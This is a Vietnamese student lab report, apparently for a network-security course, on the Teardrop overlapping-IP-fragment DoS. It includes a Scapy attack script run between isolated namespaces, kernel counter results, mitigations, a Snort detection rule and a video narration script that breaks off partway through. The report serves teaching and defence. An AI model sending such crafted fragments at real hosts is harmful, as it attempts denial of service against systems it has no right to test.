# BÁO CÁO THỰC HÀNH CHI TIẾT — BÀI LAB 06
## Đề tài: Kỹ thuật tấn công Teardrop Attack (Overlapping IP Fragments DoS)

---

## I. MỤC TIÊU BÀI THỰC HÀNH

1. **Hiểu sâu sắc cơ chế Phân mảnh và Tái hợp gói tin IP (IP Fragmentation & Reassembly)**:
   * Nguyên nhân gói tin IP bị phân mảnh khi kích thước vượt quá kích thước đơn vị truyền tải tối đa (MTU - Maximum Transmission Unit) của đường truyền.
   * Các trường thông tin quan trọng trong IP Header phục vụ tái hợp gói: **Identification (ID)**, **Flags (DF, MF)** và **Fragment Offset**.
2. **Nghiên cứu kỹ thuật tấn công từ chối dịch vụ Teardrop kinh điển (CVE-1999-0015)**:
   * Cách kẻ tấn công cố tình tính toán sai lệch trường **Fragment Offset** để tạo ra các mảnh IP có dữ liệu bị đè (chồng lấn - overlapping) lên nhau.
   * Phân tích mã nguồn nhân hệ điều hành cũ (Linux 2.0.32, Windows 95/NT): Lỗi tính toán `fp->len = end - offset` dẫn đến số âm và ép kiểu thành $\approx 4\text{ GB}$ trong hàm `memcpy()`, gây sập máy (Blue Screen of Death / Kernel Panic).
3. **Thực nghiệm chế tạo gói tin Teardrop bằng Scapy**:
   * Viết script Python với Scapy chế tạo 2 mảnh IP chồng lấn: Mảnh 1 (0..23 byte) và Mảnh 2 (8..31 byte), trong đó đoạn từ byte 8 đến byte 23 bị chồng lấn 16 bytes.
4. **Kiểm chứng tính an toàn và miễn nhiễm của nhân Linux hiện đại**:
   * Quan sát máy Nạn nhân (`h2`) thông qua luồng ping liên tục: Máy vẫn hoạt động bình thường, không bị sập hay mất gói.
   * Đo đạc bộ đếm thống kê mạng tại `/proc/net/snmp`: Chỉ số `ReasmReqds` tăng 2 (nhận 2 mảnh) và chỉ số `ReasmFails` tăng 1 (phát hiện mảnh dị thường và hủy bỏ an toàn).

---

## II. KIẾN THỨC NỀN TẢNG CỐT LÕI

### 1. Phép ẩn dụ đời thực: "Quyển sách bị xé trang và ghi sai số thứ tự"
* Hãy tưởng tượng bạn muốn gửi một quyển sách dày cho bạn mình, nhưng khe hộp thư bưu điện quá nhỏ (tương tự giới hạn **MTU** của card mạng, thường là 1500 bytes).
* **Bình thường:** Bạn xé quyển sách thành nhiều tập mỏng:
  * Tập 1: Gồm các trang từ 1 đến 24. Đánh dấu: *"Còn tiếp"* (**cờ MF = 1**).
  * Tập 2: Gồm các trang từ 25 đến 40. Đánh dấu: *"Hết"* (**cờ MF = 0**).
  * Người nhận chỉ việc xếp tập 1 rồi ghép tập 2 vào sau là đọc được trọn vẹn quyển sách.
* **Tấn công Teardrop:** Kẻ xấu cố tình ghi nhãn số trang bị đè lên nhau:
  * Tập 1: Gồm các trang từ 1 đến 24 (**Offset = 0**, kết thúc tại 24).
  * Tập 2: Ghi nhãn bắt đầu từ trang 9 đến trang 32 (**Offset = 8 byte**, kết thúc tại 32).
  * **Hậu quả:** Đoạn từ trang 9 đến trang 24 bị thừa và đè lên nhau! Hệ thống phải giải quyết bài toán: Chép phần nào và bỏ phần nào?

---

### 2. Ba trường quan trọng trong IP Header điều khiển phân mảnh

```text
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

1. **Identification (ID - 16 bit)**:
   * Mã định danh của gói tin gốc. Tất cả các mảnh cắt ra từ cùng một gói tin bắt buộc phải có **chung một giá trị ID** thì bên nhận mới biết để ghép lại với nhau.
2. **Flags (3 bit)**:
   * **Bit 0:** Dành riêng (phải luôn bằng 0).
   * **Bit 1 (DF - Don't Fragment):** Nếu = 1, cấm các router trên đường đi cắt nhỏ gói tin.
   * **Bit 2 (MF - More Fragments):** 
     * `MF = 1`: Báo hiệu rằng phía sau mảnh này vẫn còn các mảnh tiếp theo.
     * `MF = 0`: Mảnh cuối cùng của gói tin gốc.
3. **Fragment Offset (13 bit)**:
   * Vị trí bắt đầu của dữ liệu trong mảnh này so với gói tin gốc ban đầu.
   * **ĐẶC BIỆT LƯU Ý:** Do trường Offset chỉ có 13 bit nhưng gói tin IP tối đa tới 65,535 bytes, nên tiêu chuẩn RFC 791 quy định **đơn vị tính của Fragment Offset là 8 bytes (64 bits)**.
   * Ví dụ:
     * `frag = 0` $\rightarrow$ Bắt đầu từ byte thứ $0 \times 8 = 0$.
     * `frag = 1` $\rightarrow$ Bắt đầu từ byte thứ $1 \times 8 = 8$.
     * `frag = 3` $\rightarrow$ Bắt đầu từ byte thứ $3 \times 8 = 24$.

---

### 3. Cơ chế toán học của Teardrop: Sự khác biệt giữa 2 kịch bản

```text
GÓI TIN GỐC (Mong muốn tái hợp):
Byte: 0                               23 24                      31
      |--------------------------------|--------------------------|

MẢNH 1 (Offset = 0, Dài 24 bytes, MF = 1):
      [0 ............................ 23] (Chứa toàn ký tự 'A')

MẢNH 2 (Offset = 1 tức là Byte 8, Dài 24 bytes, MF = 0):
               [8 ............................ 31] (Chứa toàn ký tự 'B')

===> VÙNG CHỒNG LẤN (OVERLAP):
               [8 ............ 23]  <--- 16 bytes bị tranh chấp đè lên nhau!
```

#### A. Mã nguồn thực tế trong Linux 2.0.32 (`net/ipv4/ip_fragment.c`)
Khi Mảnh 2 tới và bị đè lên Mảnh 1, hàm xử lý của hệ điều hành thực hiện:
```c
/* Nếu Mảnh 2 bắt đầu (offset=8) trước khi Mảnh 1 kết thúc (prev->end=24) */
if (prev != NULL && offset < prev->end) {
    i = prev->end - offset;  // Phần trùng: i = 24 - 8 = 16 byte
    offset += i;             // Đẩy điểm bắt đầu của Mảnh 2 lên: offset = 8 + 16 = 24
    ptr += i;                // Nhảy con trỏ dữ liệu bỏ qua 16 byte trùng
}

/* Tính độ dài dữ liệu còn lại của Mảnh 2 để chép vào buffer: */
fp->len = end - offset;      // <--- ĐIỂM XẢY RA LỖI TỬ THẦN
```

#### B. Hai kịch bản tính toán:

| Đặc điểm so sánh | Kịch bản 1: Teardrop tử thần (Năm 1997) | Kịch bản 2: Bài Lab thực hành (Thầy cô giao) |
| :--- | :--- | :--- |
| **Cấu tạo Mảnh 2** | Bắt đầu từ byte 8, **chỉ dài 10 byte** (kết thúc tại byte 18, `end = 18`). Mảnh 2 lọt thỏm trong Mảnh 1! | Bắt đầu từ byte 8, **dài 24 byte** (kết thúc tại byte 32, `end = 32`). Mảnh 2 vươn dài ra sau Mảnh 1! |
| **Giá trị `offset` sau điều chỉnh** | Bị đẩy lên bằng điểm kết thúc của Mảnh 1: **`offset = 24`** | Bị đẩy lên bằng điểm kết thúc của Mảnh 1: **`offset = 24`** |
| **Công thức: `fp->len = end - offset`** | $\text{fp->len} = 18 - 24 = \mathbf{-6}$ **(Số ÂM)** | $\text{fp->len} = 32 - 24 = \mathbf{+8}$ **(Số DƯƠNG)** |
| **Hậu quả trên hệ điều hành cũ** | `-6` bị ép kiểu không dấu (`size_t`) trong `memcpy` thành $\approx \mathbf{4,2\text{ GB}}$. Ghi đè 4GB vào RAM $\rightarrow$ **SẬP MÁY / BSOD NGAY LẬP TỨC!** | Hệ thống cũ chấp nhận chép 8 byte còn lại vào cuối. |
| **Phản ứng của Kernel hiện đại** | Kernel kiểm tra biên: `if (end <= offset) return;` $\rightarrow$ Hủy gói tin, không bao giờ bị âm. | **Kernel nhận diện vùng 8..23 bị chồng lấn dị thường**, coi là gói tin hỏng $\rightarrow$ Hủy an toàn và tăng `ReasmFails` lên 1! |

---

## III. GIẢI THÍCH CHI TIẾT CÁC FILE MÃ NGUỒN

Các file phục vụ thực hành được lưu tại: `/home/tantayen/Projects/TCPIP/LabLoHongBaoMatTCPIP/`

### 1. File `setup_pair.sh` (Dựng topo 2 máy độc lập qua cặp veth)
* **Chức năng**: Khởi tạo 2 không gian mạng (`h1` và `h2`) kết nối trực tiếp với nhau bằng sợi cáp ảo `veth1 <---> veth2`.
* **Phân bổ địa chỉ IP**:
  * `h1`: `10.0.0.1/24` (Máy Kẻ tấn công).
  * `h2`: `10.0.0.2/24` (Máy Nạn nhân).
* **Mã nguồn**:
  ```bash
  #!/bin/bash
  set -e
  ip netns del h1 2>/dev/null || true
  ip netns del h2 2>/dev/null || true

  ip netns add h1
  ip netns add h2

  ip link add veth1 type veth peer name veth2
  ip link set veth1 netns h1
  ip link set veth2 netns h2

  ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
  ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2

  ip netns exec h1 ip link set veth1 up
  ip netns exec h2 ip link set veth2 up
  ip netns exec h1 ip link set lo up
  ip netns exec h2 ip link set lo up

  echo "[+] Topo 2 may (h1: 10.0.0.1 <---> h2: 10.0.0.2) da san sang!"
  ip netns exec h1 ping -c 2 10.0.0.2
  ```

---

### 2. File `teardrop_attack.py` (Script phát động tấn công phân mảnh chồng lấn)
* **Chức năng**: Sử dụng thư viện Scapy chế tạo 2 mảnh IP chồng lấn và phát tới máy Nạn nhân.
* **Mã nguồn chi tiết**:
  ```python
  #!/usr/bin/env python3
  # teardrop_attack.py - Mo phong tan cong phan manh IP chong lan (Teardrop Attack)
  import sys
  from scapy.all import *

  victim_ip = "10.0.0.2"
  ipid = 1234  # Identification de ghep 2 manh voi nhau

  # 1. Manh 1: frag=0 (Byte 0..23), co co MF=1 (con tiep)
  f1 = IP(dst=victim_ip, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)

  # 2. Manh 2: frag=1 (Byte 8..31), co co MF=0 (manh cuoi)
  # ==> Khoang tu byte 8 den byte 23 bi CHONG LAN (Overlap 16 bytes)!
  f2 = IP(dst=victim_ip, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)

  print(f"[*] Dang ban 2 manh IP chong lan (Teardrop) toi {victim_ip}...")
  send([f1, f2], verbose=0)
  print("[+] Da gui thanh cong!")
  ```

---

### 3. File `clean_pair.sh` (Dọn dẹp môi trường)
* **Chức năng**: Xóa sạch các namespace và bridge sau khi kết thúc bài lab:
  ```bash
  #!/bin/bash
  for ns in h1 h2 vic gw atk dst amp1 amp2 amp3; do
      ip netns del $ns 2>/dev/null || true
  done
  ip link del br0 2>/dev/null || true
  ```

---

## IV. TRÌNH TỰ CÁC BƯỚC THỰC HÀNH & KẾT QUẢ QUAN SÁT THỰC TẾ

### Bố trí màn hình Terminal (Gồm 3 cửa sổ):
* **Cửa sổ Trên - Trái (`sudo`)**: Đóng vai trò máy theo dõi nhịp tim của Nạn nhân `h2` $\rightarrow$ chạy lệnh `sudo ip netns exec h2 ping -i 0.3 10.0.0.1` liên tục.
* **Cửa sổ Dưới - Trái (`zsh`)**: Terminal quản trị của Nạn nhân `h2` $\rightarrow$ dùng để kiểm tra bộ đếm thống kê IP `/proc/net/snmp` trước và sau tấn công.
* **Cửa sổ Phải (`LabLoHongBaoMatTCPIP : zsh`)**: Terminal của Kẻ tấn công `h1` $\rightarrow$ dùng để phát động script tấn công `teardrop_attack.py`.

---

### Bước 1: Khởi tạo mô hình mạng ảo
Tại terminal Trên - Trái:
```bash
sudo bash clean_pair.sh
sudo bash setup_pair.sh
```
* **Kết quả quan sát**:
  * Các namespace cũ được dọn dẹp sạch sẽ.
  * Hai namespace `h1` (`10.0.0.1`) và `h2` (`10.0.0.2`) được tạo và nối với nhau qua cặp card mạng ảo `veth1` - `veth2`.
  * Script tự động gửi 2 gói ping kiểm tra thông suốt giữa hai máy (`0.042 ms / 0.078 ms`, 0% packet loss).

---

### Bước 2: Thiết lập tiến trình ping liên tục theo dõi "nhịp tim" của Nạn nhân
Tại cửa sổ **Trên - Trái**, ngay sau khi khởi tạo mạng xong, chạy lệnh ping liên tục từ Nạn nhân `h2` sang `10.0.0.1`:
```bash
sudo ip netns exec h2 ping -i 0.3 10.0.0.1
```
* **Ý nghĩa & Hiện tượng**:
  * Tùy chọn `-i 0.3` phát gói ping mỗi 0.3 giây một lần.
  * Dòng ping bắt đầu nhảy liên tục (`icmp_seq=1, 2, 3...` với độ trễ cực thấp ~0.04 ms).
  * **Mục đích khoa học:** Đây là công cụ đo "nhịp tim" trực tiếp của máy Nạn nhân. Nếu đòn tấn công Teardrop làm Kernel bị crash, sập máy (Kernel Panic / BSOD) hoặc đóng băng (DoS) như trên hệ điều hành cũ, luồng ping này sẽ lập tức bị đứt đoạn hoặc dừng hẳn.

---

### Bước 3: Ghi nhận chỉ số thống kê mạng ban đầu của Nạn nhân
Tại cửa sổ **Dưới - Trái**, kiểm tra bảng đếm IP SNMP của `h2` trước khi bị tấn công:
```bash
sudo ip netns exec h2 cat /proc/net/snmp | grep -A1 "^Ip:"
```
* **Kết quả thu được**:
  ```text
  Ip: Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ForwDatagrams InUnknownProtos InDiscards InDelivers OutRequests OutDiscards OutNoRoutes ReasmTimeout ReasmReqds ReasmOKs ReasmFails FragOKs FragFails FragCreates OutTransmits
  Ip: 2 64 35 0 0 0 0 0 35 0 0 0 0 0 0 0 0 0 0 35
  ```
  *(Các chỉ số liên quan đến phân mảnh IP: `ReasmReqds = 0`, `ReasmOKs = 0`, `ReasmFails = 0`).*

---

### Bước 4: Kẻ tấn công phát động Teardrop Attack
Tại cửa sổ **Bên Phải** (`h1`), kích hoạt script tấn công:
```bash
cd /home/tantayen/Projects/TCPIP/LabLoHongBaoMatTCPIP
sudo ip netns exec h1 python3 teardrop_attack.py
```
* **Kết quả xuất ra trên terminal Phải**:
  ```text
  ==================================================================
  [*] TAN CONG TEARDROP ATTACK (OVERLAPPING IP FRAGMENTS)
  ==================================================================
  [*] Muc tieu nan nhan (Victim):       10.0.0.2
  [*] IP Identification (ID goi):       1234
  [*] Giao thuc mang theo (Protocol):    17 (UDP)
  ==================================================================
  [*] Thong tin chi tiet cac manh IP duoc che tao:
      - Manh 1: Offset = 0 (Byte 0..23), Co MF = 1 (Con manh)
      - Manh 2: Offset = 1 (Byte 8..31), Co MF = 0 (Manh cuoi)
      ==> Vung chong lan (Overlap): Byte 8 den Byte 23 (16 byte bi de len nhau!)
  ==================================================================
  [*] Dang ban 2 manh IP chong lan toi 10.0.0.2...
  [+] DA GUI THANH CONG!
      -> Hay kiem tra thong ke ReasmFails tai Victim: cat /proc/net/snmp | grep -A1 "^Ip:"
      -> Kiem tra xem Victim co bi crash khong (Kernel hien dai se mien nhiem 100%).
  ```

---

### Bước 5: Đánh giá kết quả thực nghiệm trên máy Nạn nhân

1. **Quan sát cửa sổ Trên - Trái (Tiến trình ping theo dõi nhịp tim)**:
   * Ngay trong và sau khi 2 mảnh Teardrop ập vào, **luồng ping vẫn chạy băng băng không hề gián đoạn**:
     ```text
     64 bytes from 10.0.0.1: icmp_seq=281 ttl=64 time=0.040 ms
     ...
     64 bytes from 10.0.0.1: icmp_seq=313 ttl=64 time=0.043 ms
     ```
   * $\rightarrow$ **Kết luận 1:** Máy Nạn nhân `h2` hoàn toàn tỉnh táo, không hề bị treo, đứng máy hay mất gói tin.

2. **Quan sát cửa sổ Dưới - Trái (Kiểm tra lại `/proc/net/snmp`)**:
   Chạy lại lệnh kiểm tra bộ đếm IP:
   ```bash
   sudo ip netns exec h2 cat /proc/net/snmp | grep -A1 "^Ip:"
   ```
   * **Kết quả sau tấn công**:
     ```text
     Ip: Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ForwDatagrams InUnknownProtos InDiscards InDelivers OutRequests OutDiscards OutNoRoutes ReasmTimeout ReasmReqds ReasmOKs ReasmFails FragOKs FragFails FragCreates OutTransmits
     Ip: 2 64 220 0 0 0 0 0 218 0 0 0 2 0 1 0 0 0 0 218
     ```

   * **Bảng so sánh định lượng giá trị thống kê:**

| Tham số thống kê trong `/proc/net/snmp` | Trước tấn công | Sau tấn công | Ý nghĩa kỹ thuật |
| :--- | :---: | :---: | :--- |
| **`ReasmReqds`** (Số mảnh yêu cầu ghép) | `0` | **`2`** | `h2` đã tiếp nhận đúng 2 mảnh IP mang chung ID `1234` |
| **`ReasmOKs`** (Tái hợp thành công) | `0` | **`0`** | Gói tin không thể ghép thành công do lỗi cấu trúc biên |
| **`ReasmFails`** (Tái hợp thất bại) | `0` | **`1`** | **Kernel phát hiện dữ liệu chồng lấn dị thường và chủ động hủy bỏ an toàn!** |

* 👉 **KẾT LUẬN QUAN TRỌNG:** 
  1. Đòn tấn công Teardrop đã thực sự diễn ra thành công và chạm tới tận tầng Network của máy đích (thể hiện qua việc `ReasmReqds` tăng 2).
  2. Nhân Linux hiện đại đã chứng minh khả năng **miễn nhiễm 100%**: phát hiện vùng đè lấn bất hợp pháp (8..23), ghi nhận `ReasmFails = 1` và tiêu hủy gói tin an toàn mà không làm rò rỉ bộ nhớ hay sập máy tính.

---

## V. CƠ CHẾ PHÒNG THỦ (MITIGATION)

1. **Cập nhật hệ điều hành và Kernel**:
   * Lỗ hổng Teardrop kinh điển (CVE-1999-0015) đã được cộng đồng mã nguồn mở và Microsoft vá từ cuối thập niên 1990 (từ Linux kernel 2.0.32 và các bản vá Service Pack của Windows NT 4.0).
2. **Cơ chế lọc và làm sạch phân mảnh tại Tường lửa (Fragment Scrubbing - RFC 1858)**:
   * Các thiết bị tường lửa thế hệ mới (Next-Gen Firewall / pfSense / iptables) thực hiện tập hợp lại tất cả các mảnh IP ở biên mạng trước khi cho vào mạng nội bộ.
   * Nếu phát hiện các mảnh có trường `offset` chồng lấn, tường lửa sẽ **tự động cắt tỉa (de-overlap)** hoặc thả rơi gói tin ngay lập tức.
3. **Cấu hình giới hạn tài nguyên hàng đợi tái hợp**:
   * Để chống lại việc kẻ tấn công gửi hàng triệu mảnh lẻ làm cạn kiệt RAM (Memory Exhaustion DoS), Linux cho phép giới hạn dung lượng bộ nhớ dành cho việc tái hợp:
     ```bash
     sysctl -w net.ipv4.ipfrag_high_thresh=4194304  # Giới hạn tối đa 4MB
     sysctl -w net.ipv4.ipfrag_time=30             # Quá 30s không đủ mảnh thì xóa
     ```
4. **Hệ thống phát hiện xâm nhập (IDS/IPS)**:
   * Các hệ thống như Snort/Suricata có sẵn luật nhận diện chữ ký phân mảnh dị thường:
     `alert ip any any -> any any (msg:"ET EXPLOIT Teardrop IP fragmentation overlap"; fragbits:M; fragoffset:>0;)`

---

## VI. CÂU HỎI ÔN TẬP & TRẢ LỜI ĐÁNH GIÁ

### Câu 1: Fragment Offset được tính theo đơn vị nào? Hai mảnh ở Bước 2.3 chồng lấn ở khoảng byte nào?
* **Trả lời:**
  * **Đơn vị tính:** Fragment Offset được tính theo **đơn vị khối 8 bytes (64 bits)**.
  * **Khoảng byte chồng lấn**:
    * Mảnh 1 có `frag = 0`, mang 24 bytes dữ liệu $\rightarrow$ Chiếm khoảng từ **Byte 0 đến Byte 23**.
    * Mảnh 2 có `frag = 1` ($1 \times 8 = 8$), mang 24 bytes dữ liệu $\rightarrow$ Chiếm khoảng từ **Byte 8 đến Byte 31**.
    * Như vậy, hai mảnh này bị **chồng lấn tại khoảng từ Byte 8 đến Byte 23** (tổng cộng 16 bytes bị đè lên nhau).

### Câu 2: Vì sao các mảnh chồng lấn từng làm hệ thống cũ bị sập (Crash)? Kernel hiện đại xử lý khác biệt ra sao?
* **Trả lời:**
  * **Hệ thống cũ bị sập**: Trong mã nguồn của Linux 2.0.32, sau khi điều chỉnh `offset` tăng lên để bỏ qua phần trùng với Mảnh 1, Kernel tính độ dài dữ liệu còn lại bằng công thức `fp->len = end - offset`. Trong đòn Teardrop nguyên bản, kẻ tấn công gửi Mảnh 2 có điểm kết thúc nhỏ hơn Mảnh 1 ($end_2 < end_1$), khiến phép trừ ra **số âm** (ví dụ $18 - 24 = -6$). Khi truyền số âm này vào hàm `memcpy(dest, src, size_t count)`, do biến `count` là số nguyên không dấu, con số âm bị ép kiểu thành một con số dương khổng lồ (~4.2GB). Việc cố sao chép 4.2GB dữ liệu vào RAM đã ghi đè toàn bộ dữ liệu quan trọng của Kernel, gây ra **Màn hình xanh (BSOD)** hoặc **Kernel Panic** làm sập máy ngay lập tức.
  * **Kernel hiện đại**: Có thuật toán kiểm tra biên nghiêm ngặt (Bounds Checking). Kernel luôn kiểm tra nếu $end \le offset$, nó lập tức từ chối ghép, hủy bỏ các mảnh dị thường và ghi nhận lỗi vào `ReasmFails`, đảm bảo hệ thống không bao giờ bị crash.

### Câu 3: Giá trị `ReasmFails` thay đổi như thế nào trước và sau khi tấn công? Nó cho biết điều gì?
* **Trả lời:**
  * **Thay đổi:** Trước khi tấn công, `ReasmFails` có giá trị là `0`. Sau khi Kẻ tấn công bắn 2 mảnh Teardrop, `ReasmFails` **tăng lên thành `1`** (đồng thời `ReasmReqds` tăng thêm `2`).
  * **Ý nghĩa:** Chỉ số này khẳng định rằng máy Nạn nhân đã thực sự tiếp nhận 2 mảnh phân mảnh, nhưng trong quá trình ghép nối, bộ giải mã IP của Kernel đã phát hiện gói tin bị sai lệch cấu trúc biên nên đã từ chối và giải phóng bộ đệm. Đây là bằng chứng định lượng rõ ràng nhất chứng minh đòn tấn công đã diễn ra và đã bị nhân Linux chặn đứng an toàn.

### Câu 4: Ngoài Teardrop, hãy nêu một số kỹ thuật tấn công khác cũng lợi dụng cơ chế phân mảnh IP và cách phòng chống?
* **Trả lời:**
  1. **Ping of Death**: Kẻ tấn công gửi các mảnh IP có tổng kích thước sau khi tái hợp vượt quá giới hạn tối đa của giao thức IPv4 ($> 65,535$ bytes), làm tràn bộ đệm nhận gói của hệ điều hành cũ.
  2. **Tiny Fragment Attack**: Kẻ tấn công cố tình cắt gói tin TCP thành các mảnh cực nhỏ (ví dụ mảnh 1 chỉ chứa 8 byte IP header mà không đủ chứa TCP port). Mục đích là để qua mặt các bộ lọc tường lửa (Firewall ACL) chỉ kiểm tra gói đầu tiên, giúp lưu lượng độc hại lọt qua.
  3. **Overlapping Fragment Evasion (Vượt mặt IDS)**: Kẻ tấn công gửi mảnh 1 chứa dữ liệu vô hại, sau đó gửi mảnh 2 ghi đè dữ liệu độc hại lên mảnh 1. Do cách ghép mảnh của IDS và máy chủ đích có thể khác nhau (First vs. Last reassembly policy), IDS thấy gói tin sạch nhưng máy đích lại ghép ra gói tin độc hại.
  * **Phòng chống:** Sử dụng tường lửa có tính năng **Virtual Reassembly / Fragment Normalization** để chuẩn hóa và ghép mảnh tại biên mạng trước khi chuyển tiếp vào bên trong.

---

## VII. KỊCH BẢN THUYẾT TRÌNH KHI QUAY VIDEO (VOICEOVER)

> **Bố cục màn hình đề xuất khi quay video (Chia 3 cửa sổ):**
> * Mở terminal và chia 3 khung hình đúng như quá trình thực hành:
>   * **Cửa sổ Trên - Trái (`sudo`):** Terminal Nạn nhân `h2` — Chạy tiến trình ping liên tục kiểm tra nhịp tim.
>   * **Cửa sổ Dưới - Trái (`zsh`):** Terminal Nạn nhân `h2` — Kiểm tra thông số IP `/proc/net/snmp`.
>   * **Cửa sổ Bên Phải (`LabLoHongBaoMatTCPIP`):** Terminal Kẻ tấn công `h1` — Phát động tấn công Teardrop.
> * Bạn vừa quan sát và gõ câu lệnh trên màn hình, vừa đọc lời thoại giải thích tương ứng dưới đây:

---

### [0:00 - 0:35] Mở đầu & Giới thiệu đề tài
* **Lời thoại:**
  *"Kính chào thầy và các bạn! Hôm nay em xin trình bày bài thực hành số 06: Kỹ thuật tấn công từ chối dịch vụ phân mảnh IP Teardrop Attack (IP Fragmentation Overlap DoS) và Kiểm chứng tính miễn nhiễm của nhân Linux hiện đại. Trong giao thức IPv4, khi một gói tin vượt quá MTU của đường truyền, nó sẽ bị chia nhỏ thành nhiều mảnh. Bên nhận dựa vào trường Identification và Fragment Offset để ghép lại. Lỗ hổng Teardrop kinh điển phát sinh khi kẻ tấn công cố tình tạo ra các mảnh có offset chồng lấn đè lên nhau, khiến thuật toán ghép mảnh của các hệ điều hành cũ bị lỗi tính toán số âm trong hàm sao chép bộ nhớ, dẫn đến tràn buffer và đánh sập máy tính (BSOD / Kernel Panic)!"*

---

### [0:35 - 1:15] Bước 1: Khởi tạo mô hình mạng ảo 2 máy & Bật luồng ping theo dõi nhịp tim
* **Thao tác 1 (Terminal Trên - Trái - Khởi tạo mạng):**
  ```bash
  sudo bash clean_pair.sh
  sudo bash setup_pair.sh
  ```
  * **Lời thoại giải thích:**
    *"Đầu tiên, ở cửa sổ phía trên bên trái, em dọn dẹp và thực thi script `setup_pair.sh`. Kịch bản này sử dụng Linux Network Namespace để tạo hai máy độc lập: h1 có địa chỉ `10.0.0.1` đóng vai kẻ tấn công, và h2 có địa chỉ `10.0.0.2` đóng vai nạn nhân, kết nối trực tiếp qua cặp card mạng ảo veth1 - veth2. Script tự động ping kiểm tra thông suốt ban đầu, mạng đã sẵn sàng!"*

* **Thao tác 2 (Terminal Trên - Trái - Chạy ping liên tục đo nhịp tim):**
  ```bash
  sudo ip netns exec h2 ping -i 0.3 10.0.0.1
  ```
  * **Lời thoại giải thích:**
    *"Ngay sau đó, cũng tại cửa sổ phía trên bên trái này, em kích hoạt một tiến trình ping liên tục từ máy nạn nhân h2 sang h1 bằng lệnh `sudo ip netns exec h2 ping -i 0.3 10.0.0.1`.
    
    Tùy chọn `-i 0.3` phát gói tin liên tục mỗi 0.3 giây. Đây chính là 'máy đo nhịp tim' thời gian thực của máy nạn nhân. Thầy và các bạn hãy chú ý: Nếu đòn tấn công Teardrop làm máy bị sập nguồn, treo máy hoặc tê liệt ngăn xếp mạng như trên hệ điều hành cũ, dòng ping này sẽ lập tức dừng nhảy và báo time-out!"*

---

### [1:15 - 2:00] Bước 2: Ghi nhận chỉ số thống kê mạng ban đầu của Nạn nhân
* **Thao tác (Terminal Dưới - Trái - Đọc thông số SNMP):**
  ```bash
  sudo ip netns exec h2 cat /proc/net/snmp | grep -A1 "^Ip:"
  ```
* **Lời thoại giải thích:**
  *"Tiếp theo, ở cửa sổ bên dưới bên trái, em đọc các chỉ số thống kê ngăn xếp mạng IP của máy nạn nhân h2 thông qua file `/proc/net/snmp`.
  
  Quan sát dòng thống kê ban đầu: Bộ đếm yêu cầu ghép mảnh `ReasmReqds`, ghép mảnh thành công `ReasmOKs`, và ghép mảnh thất bại `ReasmFails` đều đang bằng 0. Nạn nhân hiện đang hoàn toàn bình thường và chưa gặp bất kỳ lỗi ghép mảnh nào."*

---

### [2:00 - 3:15] Bước 3: Kẻ tấn công phát động Teardrop Attack
* **Thao tác (Terminal Bên Phải - Chạy script tấn công):**
  ```bash
  cd /home/tantayen/Projects/TCPIP/LabLoHongBaoMatTCPIP
  sudo ip netns exec h1 python3 teardrop_attack.py
  ```
* **Lời thoại giải thích:**
  *"Bây giờ tại cửa sổ bên phải của kẻ tấn công h1, em phát động đòn tấn công bằng lệnh `sudo ip netns exec h1 python3 teardrop_attack.py`.
  
  Script Python này sử dụng thư viện Scapy để chế tạo 2 mảnh IP bất thường mang chung mã `ID = 1234` nhắm vào h2:
  * Mảnh thứ nhất: `Offset = 0`, mang 24 bytes (từ byte 0 đến byte 23), bật cờ `MF = 1` (báo vẫn còn mảnh tiếp theo).
  * Mảnh thứ hai: `Offset = 1` (theo quy ước đơn vị 8 byte của IP Header, tức vị trí bắt đầu là 1 x 8 = byte 8), mang 24 bytes (từ byte 8 đến byte 31), cờ `MF = 0` (mảnh cuối cùng).
  
  Điểm cốt lõi của đòn Teardrop là: Vùng từ **byte số 8 đến byte số 23 bị chồng lấn đè lên nhau 16 bytes**! Trên các hệ điều hành cổ như Windows 95 hay Linux 2.0.32, phép trừ chiều dài còn lại `fp->len = end - offset` sẽ ra số âm, khi ép kiểu không dấu trong hàm `memcpy` biến thành một số dương khổng lồ hơn 4GB, tràn bộ nhớ và đánh sập máy ngay tắp lự!"*

---

### [3:15 - 4:15] Bước 4: Kiểm chứng tính miễn nhiễm của Linux Kernel & Kết luận
* **Thao tác (Terminal Dưới - Trái - Đọc lại thông số SNMP):**
  ```bash
  sudo ip netns exec h2 cat /proc/net/snmp | grep -A1 "^Ip:"
  ```
* **Lời thoại giải thích:**
  *"Sau khi 2 mảnh IP chồng lấn được bắn sang nạn nhân, hãy quan sát 2 cửa sổ bên trái:
  
  Thứ nhất, nhìn lên cửa sổ phía trên bên trái: Dòng ping nhịp tim vẫn nhảy tanh tách đều đặn, không hề rớt dù chỉ 1 gói tin, độ trễ giữ nguyên ở mức 0.04 ms! Máy nạn nhân hoàn toàn không bị crash hay đơ mạng!
  
  Thứ hai, nhìn xuống cửa sổ phía dưới bên trái: Em kiểm tra lại file `/proc/net/snmp`. Kết quả vô cùng rõ ràng: Chỉ số `ReasmReqds` tăng lên 2 — khẳng định h2 đã nhận đủ 2 mảnh; và chỉ số `ReasmFails` tăng lên 1 — chứng minh bộ giải mã của Linux Kernel đã nhận diện được sự chồng lấn dị thường, từ chối ghép nối và tiêu hủy an toàn gói tin rác mà không hề xảy ra tràn bộ đệm!
  
  Điều này chứng minh: Nhân Linux hiện đại đã được trang bị cơ chế kiểm tra biên chặt chẽ (Bounds Checking) và hoàn toàn miễn nhiễm 100% trước đòn tấn công Teardrop kinh điển!"*

---

### [4:15 - 4:50] Bước 5: Dọn dẹp & Giải pháp phòng vệ
* **Thao tác:**
  Nhấn `Ctrl + C` dừng ping ở cửa sổ Trên - Trái, sau đó chạy:
  ```bash
  sudo bash clean_pair.sh
  ```
* **Lời thoại giải thích:**
  *"Em dừng tiến trình ping và thực thi script `clean_pair.sh` để giải phóng namespace và card mạng ảo.
  
